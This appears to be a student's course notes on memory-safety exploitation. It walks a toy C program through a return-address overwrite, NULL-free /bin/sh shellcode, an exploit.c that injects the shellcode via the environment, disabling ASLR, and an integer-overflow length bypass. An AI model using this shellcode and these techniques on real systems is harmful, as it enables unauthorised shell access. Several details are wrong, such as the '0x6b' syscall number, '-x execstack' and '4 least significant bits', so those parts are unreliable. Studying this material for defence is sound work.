---
Tags: 
Created: 2023-10-03 00:29:22
Links: "[[Secure Programming]]"
---
(Links:: [[Secure Programming]])
# Overwrite return address
```c
#include <stdio.h>
#include <string.h>
void hello(char *name) {
	char buf[16];
	strcpy(buf, name);
	printf("hello %s\n", buf);
}
public main (int argc, char **argv) {
	hello(argv[1]);
	return 0;
}
```
We must find the location of the return address to know how much to overflow the buffer. After that we can enter a return address.

> [!example] `hello()`
> Compile: `cc -fno-stack-protector -o vulnerable vulnerable.c` `objdump -d vulnerable`
> ```
> 000000000000068a \<hello>:  
> 	68a push %rbp  
> 	68b mov %rsp, %rbp  
> 	68e sub $0x20, %rsp  
> 	692 mov %rdi, -0x18(%rbp)  
> 	696 mov -0x18(%rbp), %rdx  
> 	69a lea -0x10(%rbp), %rax  
> 	69e mov %rdx, %rsi  
> 	6a1 mov %rax, %rdi  
> 	6a4 callq 550 \<strcpy@plt>  
> 	6a9 lea -0x10(%rbp), %rax  
> 	6ad mov %rax, %rsi  
> 	6b0 lea 0xbd(%rip), %rdi # 774 <_IO_stdin_used+0x4> 6b7 mov $0x0, %eax  
> 	6bc callq 560 \<printf@plt>  
> 	6c1 nop  
> 	6c2 leaveq  
> 	6c3 retq
> ```
> - `lea` loads address `%rbp-0x10` to be used as destination for *first* argument -> this is the address of `buf`
> - At the start of a function the return address is pushed and `(%rsp)` points to it
> - `push` subtracts 8 from `%rsp` -> `%rsp+8` points to `retaddr`
> - After `mov %rsp, %rbp` we can also use `%rbp+8` as pointer to `retaddr`
> 	- Thus the return address is at `%rbp+8`
> 	- Since the `buf` is stored at `%rbp-16` we must write $$(\%rbp+8)-(\%rbp-16) = 8 - -16 = 24$$
> 	  bytes of random data and then the return address

After finding a vulnerability that overwrites the return address, we can exploit the program by pointing it to either
- code that is already in the program
- code that the attacker injects into the program

## Injecting Code
On x86 CPUs, data and code is indistinguishable. We can 
- read program code as data or
- execute data like code

Injecting code can occur through
- program parameters
- environment variables
- provide as input that is stored in buffer

Injected code must
- Work regardless of where it is stored in memory
- Not depend on any external code such as libraries (we do not know their location)
- Not contain any NULL bytes (this would terminate it if stored as a string, which is common)
- Do something that gives attacker control of the system
---
- User code cannot start a program, the OS kernel does that
- We tell the kernel to do something for us using a [[system call]]
	- A special instruction switches to the kernel
	- Based on parameters stored in registers/process memory, kernel performs the required task
	- Kernel returns to our program

In order to start a shell we must execute it using the `execve` syscall: `execve("/bin/sh", argv, NULL)`, with `char argv[] = { "/bin/sh", NULL }`. Our shellcode needs the following
- A string "/bin/sh" in memory
- An array in memory, containing a pointer to "/bin/sh" and a NULL pointer
- A pointer to the string in `%rdi` (`progname`)
- A pointer to the array in `%rsi` (`argv`)
- A NULL pointer in `%rdx` (`envp`)
- The system call number `0x6b` in `%rax`

```java
.data
.globl shellcode
shellcode:
	leaq string_addr(%rip), %rdi    // set progname (arg 1)
	movb $0, 0x07(%rdi)             // NULL terminator after sh
	movq %rdi, 0x08(%rdi)           // set argv[0] (AAAAAAAA)
	movq $0, 0x10(%rdi)             // set argv[1] (BBBBBBBB)
	leaq 0x08(%rdi), %rsi           // set argv (arg 2)
	movq $0, %rdx                   // set envp (arg 3)
	movl $0x3b, %eax                // set syscall number
	syscall                         // go to kernel (no return)
string_addr:
  .ascii "/bin/shNAAAAAAAABBBBBBBB"
  .byte 0                           // end of string
```

> [!bug] Shellcode Problems
> We specified before that the code **cannot** include any NULL bytes:
> 1. `movb` commands contains NULL bytes
> 2. `movl $0x3b, %eax` doesn't copy 1 byte, but 4: `long 0x3b` -> `0x0000003b`
> 3. `leaq string_addr(%rip), %rdi` loads the offset from the command to the string, but using 4 bytes:
>    `offset 0x22` -> `0x00000022`

```java
.data  
.globl shellcode  
shellcode:                             // jump over the string
	jmp over_string  
string_addr:  
	.ascii "/bin/shNAAAAAAAABBBBBBBB"
over_string:
	leaq string_addr(%rip), %rdi       // offset now negative (0xffffffe1)
	xorl %eax, %eax                    // set %rax to zero
	movb %al,   0x07(%rdi)             // use %rax to avoid explicit zero
	movq %rdi,  0x08(%rdi)
	movq %rax,  0x10(%rdi)             // user %rax to avoid explicit zero
	leaq 0x08(%rdi), %rsi
	movq %rax, %rdx                    // user %rax to avoid explicit zero
	movb $0x3b, %al                    // bytes reg avoids zero, upper bytes are zero
	syscall
	.byte 0
```
# Practical Memory Error Exploits
First we switch off aslr, compile a program which dumps its memory, and run using a replaced environment:
```bash
ehco 0 | sudo tee /proc/sys/kernel/randomize_va_space
cc -o dump dump.c
env -i env1=x env2=y ./dump arg1 arg2
```
The following memory represents the bottom of the stack.
```
7fffffffee30 03 00 00 00 00 00 00 00 d2 ef ff ff ff 7f 00 00 ................ 7fffffffee40 d9 ef ff ff ff 7f 00 00 de ef ff ff ff 7f 00 00 ................ 7fffffffee50 00 00 00 00 00 00 00 00 e3 ef ff ff ff 7f 00 00 ................ 7fffffffee60 ea ef ff ff ff 7f 00 00 00 00 00 00 00 00 00 00 ................ 7fffffffee70 21 00 00 00 00 00 00 00 00 a0 ff f7 ff 7f 00 00 !...............
...
7fffffffefb0 00 00 00 00 00 00 00 00 00 b4 92 63 55 19 a5 75 ...........cU..u
7fffffffefc0 35 1d 7d 1e 03 fc 5d 9e 8f 78 38 36 5f 36 34 00 5.}...]..x86_64.
7fffffffefd0 00 00 2e 2f 64 75 6d 70 00 61 72 67 31 00 61 72 .../dump.arg1.ar
7fffffffefe0 67 32 00 65 6e 76 31 3d 78 00 65 6e 76 32 3d 79 g2.env1=x.env2=y
7fffffffeff0 00 2e 2f 64 75 6d 70 00 00 00 00 00 00 00 00 00 ../dump.........
```
In the memory above, there is stored addresses to the data stored below. These arrays store pointers for `main` to execute with.
- `d2 ef ff ff ff 7f 00 00`: pointer to `./dump.` on the stack
- `d9 ef ff ff ff 7f 00 00`: pointer to `arg1.` on the stack
- `de ef ff ff ff 7f 00 00`: pointer to `arg2.` on the stack
- `e3 ef ff ff ff 7f 00 00`: pointer to `env1=x.` on the stack
- `ea ef ff ff ff 7f 00 00`: pointer to `env2=y.` on the stack

At the bottom of the stack we can see the stored command; they are all null terminated:
- `2e 2f 64 75 6d 70 00`: `./dump.`
- `61 72 67 31 00`: `arg1.`
- `61 72 67 32 00`: `arg2.`
- `65 6e 76 31 3d 78 00`: `env1=x.`
- `65 6e 76 32 3d 79 00`: `env2=y.`
- `2e 2f 64 75 6d 70 00`: `./dump.`

To pass the shellcode as an environment variable, we compute the address as follows:
- start with `0x7ffffffff000` (bottom of stack)
- subtract 8 (null bytes always at the beginning/bottom)
- subtract (`strlen(progname)` + 1)
- subtract (`strlen(shellcode)` + 1)

## exploit.c
```c
#include <string.h>  
#include <unistd.h>  
#define PROGNAME "./vulnerable"
extern char shellcode[];               // Fill argument with 'x' characters
int main(void) {
	char arg[33];
	char *argv[] = { PROGNAME, arg, NULL };           // location where return address will be
	char *envp[] = { shellcode, NULL };
	long addr = 0x7ffffffff000 - 8 - (strlen(PROGNAME) + 1) - (strlen(shellcode) + 1);
	memset(arg, 'x', sizeof(arg));
	*(long *) (arg+24) = addr;                        // Write address (as binary number) to location where return address will be
	arg[sizeof(arg) - 1] = 0;
	execve(PROGNAME, argv, envp);
	return 1;
}
```
Now we can run the exploit:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
cc -fno-stack-protector -x execstack -o vulnerable vulnerable.c
cc -o exploit exploit.c shellcode.s
./exploit
hello xxxxxxxxxxxxxxxxxxxxxxxx▒▒▒▒▒
$ shell executed from ./vulnerable
```
---
## Shell Injection Parameters

> [!question] Is this program properly secured?
> ```c
> int main(int argc, char **argv) {
> 	char url[112], path[48], host[48];
> 	if(strlen(argv[1])>sizeof(host)) return 1;
> 	if(strlen(argv[2])>sizeof(path)) return 1;
> 	strcpy(host, argv[1]);
> 	strcpy(path, argv[2]);
> 	sprintf(url, "http://%s/%s", host, path);
> 	printf("url=%s\n", url);
> 	return 0;
> }
> ```
> > [!info] Solution
> > We forgot to have 1 more byte for the NULL byte
> > If we type in a string of 48 bytes into `host`, the resulting NULL byte would be put by `strcpy` at the beginning of `path`, which would be overwritten by the copy of `path`.

```
000000000000071a <main>:
...
778: mov    -0xe0(%rbp), %rax
785: add    $0x8,        %rax
789: mov    (%rax),      %rdx
78c: lea    -0xd0(%rbp), %rax
793: mov    %rdx,        %rsi
796: mov    %rax,        %rdi
799: callq  5c0 <strcpy@plt> 
79e: mov    -0xe0(%rbp), %rax
7a5: add    $0x10,       %rax
7a9: mov    (%rax),      %rdx
7ac: lea    -0xa0(%rbp), %rax 
7b3: mov    %rdx,        %rsi 
7b6: mov    %rax,        %rdi 
7b9: callq  5c0 <strcpy@plt> 
7be: lea    -0xa0(%rbp), %rcx    
7c5: lea    -0xd0(%rbp), %rdx 
7cc: lea    -0x70(%rbp), %rax 
7d0: lea    0xbd(%rip),  %rsi 
7d7: mov    %rax,        %rdi 
7da: mov    $0x0,        %eax 
7df: callq  5f0 <sprintf@plt>
...
```
- we store `url` at `-0x70(%rbp)`
- we store `host` at `-0xd0(%rbp)`
- we store `path` at `-0xa0(%rbp)`
- the return address is once again `+8(%rbp)` if we do not use stack randomization/optimization

Now we can calculate the distances between these variables:
- host to path = $(\verb|-0xa0|) - (\verb|-0xd0|) = \verb|0x30| = 48 \text{ bytes}$
- path to url = $(\verb|-0x70|) - (\verb|-0xa0|) = \verb|0x30| = 48 \text{ bytes}$
- url to return address = $(+8) - (\verb|-0x70|) = \verb|0x78| = 120 \text{ bytes}$

We can now find out what and how long of data we should provide to overwrite the return address with our own:
- write exactly 48 bytes into host -> path overwrites null bytes resulting in `len(host)` = 48 + `strlen(path)`
- After `sprintf` length of `url` is $8 + 48 + 2 \times \verb|strlen(path)|$

> [!warning] Pointers only use 48 least significant bits
> Every pointer ends with two null bytes (because of little endian)

Computation of required input length:
- To reach the return address we need to write 120 bytes in the url, this consisting of $8 + 48 + 2 \times \verb|strlen(path)|$
- We then must write 6 bytes for the return address
- We must thus write 126 byte of data, but we must find out how long the path should be: $$\begin{align}8+48+2\times \verb|strlen(path)| &= 120 + 6 \\ 2\times\verb|strlen(path)| &= 70 \\ \verb|strlen(path)| &= 35\end{align}$$
  where the last 6 bytes are the return address

### Performing the Attack
- Run the vulnerable program
- Environment: inject shellcode (like before)
- 1st parameter (host): 48 characters
	- All non-zero garbage characters
- 2nd parameter (path): 35 characters  
	- First 29: non-zero garbage characters  
	- Final 6: non-zero bytes of pointer to shellcode
## Shell Injection Remotely
```c
static void handle_request(int sockfd) {
	char buf[256] = "received this request: ";
	uint16_t len, total;

	read(sockfd, &len, sizeof(len));
	total = strlen(buf) + len;
	if (total >= sizeof(buf)) return;

	read(sockfd, buf + strlen(buf), len);
	write(sockfd, buf, total);
}
```
By writing a large enough value into `len` we can take advantage of an [[Integer Overflow Attack]]: 
- `strlen(buf)` + `len` = `0x0000000000000017` + `0xffff` = `0x0000000000010016`
- the result is stored in `uint16_t total`, keeping only the 4 least significant bits: `0x0016`
- because 22 (`total`) < 256 (`sizeof(buf)`), size check is bypassed
- reads up to 65535 bytes; `read()` might fail with EFAULT if not all of buffer writable

Although injecting a shellcode through the environment is the easiest, it doesn't work remotely -> send shellcode with **inputs**. This way, it is harder to find the location of the shellcode. Creating a program with *similar memory layout* we can get the approximate location. Another way is to use *trial and error* (server will store attempts in logs). We can also use a **NOP sled**.
### NOP Sled
- NOP instruction does nothing when executed (no-operation)
- When jumping anywhere into a sequence of NOP instructions, we end up at the next instruction behind it.
- With large NOP sled, much better chance of reaching shellcode
# Exploiting Other Vulnerabilities
- Stack buffer overflow relatively easy due to return address
- Some others can be used to create buffer overflow
	- Integer overflow: bypass length check
- Yet others provide an arbitrary write
	- Write attack-chosen value at attacker-chosen address
	- Can use to overwrite code pointer
	- Examples: heap buffer overflows, format strings
- Some vulnerabilities only allow corrupting specific data
	- Make into arbitrary write by overwriting pointer
	- Make into buffer overflow by overwriting length/index
	- Make into authorization violation by overwriting path
	- Examples: user-after-free, type confusion

---
References: